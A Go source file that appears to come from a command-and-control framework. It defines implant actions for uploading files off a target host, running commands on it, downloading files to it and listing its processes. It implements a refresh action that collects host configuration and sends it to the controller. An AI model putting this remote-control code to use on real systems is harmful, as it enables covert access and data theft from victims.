package control

import (
	"context"
	"io"

	"github.com/iDigitalFlame/logx/logx"
	"github.com/iDigitalFlame/xmt/xmt/com"
	"github.com/iDigitalFlame/xmt/xmt/data"
	"github.com/iDigitalFlame/xmt/xmt/device"
)

const (
	// Upload is the files upload action. This will transmit files from
	// the target host to the server.
	Upload = upload(0xFE10)

	// Refresh is an action that instructs a host to update and send back
	// any new changes to its network and system configuration.
	Refresh = refresh(0xFE07)

	// Execute is an action that will run a command with the specified
	// parameters on the hosts system and return the results.
	Execute = execute(0xFE08)

	// Download is an action that will download file/bytes/reader contents to
	// the target host from the server.
	Download = download(0xFE09)

	// ProcessList is an action that retrives the list of running processes
	// on the target host.
	ProcessList = list(0xFE14)
)

type refresh uint16

// Action is an interface that defines functions for handeling
// and processing Packet command functions.
type Action interface {
	Thread() bool
	Execute(Session, data.Reader, data.Writer) error
}

// Session is a helper interface that describes the c2.Session
// struct functions. This prevents this package from preforming an import cycle.
type Session interface {
	Wake()
	Wait()
	Shutdown()
	Log() logx.Log
	IsProxy() bool
	String() string
	IsActive() bool
	IsClient() bool
	Remote() string
	Read() *com.Packet
	Write(*com.Packet)
	Session() device.ID
	Host() *device.Machine
	ReadPacket() *com.Packet
	Context() context.Context
	WritePacket(*com.Packet) error
	io.Closer
}

func (refresh) Thread() bool {
	return false
}
func (r refresh) Do(s Session) error {
	return s.WritePacket(&com.Packet{ID: uint16(r)})
}
func (refresh) Execute(_ Session, _ data.Reader, w data.Writer) error {
	if err := device.Local.Refresh(); err != nil {
		return err
	}
	return device.Local.MarshalStream(w)
}
